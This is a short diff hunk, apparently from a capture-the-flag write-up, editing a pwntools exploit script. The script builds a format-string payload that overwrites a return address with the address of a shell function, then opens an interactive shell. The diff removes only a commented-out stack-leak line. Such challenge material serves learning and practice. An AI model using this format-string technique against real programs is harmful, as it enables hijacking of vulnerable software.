@@ -161,7 +161,6 @@ shell_addr = 0x804867b
 ret_addr = 0xffffdd30 - 0x4
 payload = fmtstr_payload(9,{ret_addr:shell_addr},write_size='short')
 n.recvuntil('But......... how ????')
-#n.sendline('%21$x')
 n.sendline(payload)
 n.interactive()
 ```
